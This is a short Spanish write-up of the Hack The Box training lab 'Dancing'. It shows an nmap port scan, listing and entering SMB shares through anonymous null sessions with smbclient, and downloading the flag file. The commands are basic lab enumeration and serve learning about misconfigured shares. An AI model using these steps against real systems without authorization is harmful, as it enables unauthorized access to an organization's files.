# 🪩 HTB - Dancing

**IP:** (dinámica)
**Dificultad:** Muy fácil
**Categoría:** Starting Point
**Autor:** [miguelt86](https://www.hackthebox.com/profile/2126021)

## 🎯 Objetivo

El objetivo técnico es la enumeración y explotación del protocolo SMB (Server Message Block). El laboratorio se centra en identificar recursos compartidos (Shares) que han sido expuestos con permisos de lectura globales y sin autenticación (Null Sessions). Se pretende evidenciar el riesgo de una mala gestión de permisos en entornos Windows, donde un atacante puede navegar por la estructura de directorios interna y extraer archivos críticos de la organización.

---

## 🔎 Escaneo Nmap
```bash
nmap -sS -Pn -p- -T4 <IP>
```
Resultado
```bash
445/tcp open  microsoft-ds
```
🔍 Enumeración SMB

## Listado de recursos compartidos:
```bash```
smbclient -L //<IP> -N

## 🔐 Acceso al recurso
```bash
smbclient //<IP>/WorkShares -N
```

## 📂 Navegación
```bash
ls
cd <directorio>
ls
get flag.txt
```

## 🏁 Flag
flag.txt
✔️ Bandera capturada correctamente.

## 🧰 Herramientas utilizadas

nmap
smbclient
openvpn

## 🏆 Resultado
Machine Rank: #329325
Fecha: 08 May 2025
Estado: Retired
✅ Bandera capturada
🎖️ Ver logro en HTB

## ✍️ Autor
GitHub: @Migueltejada86
HTB Profile: miguelt86 🐍x💻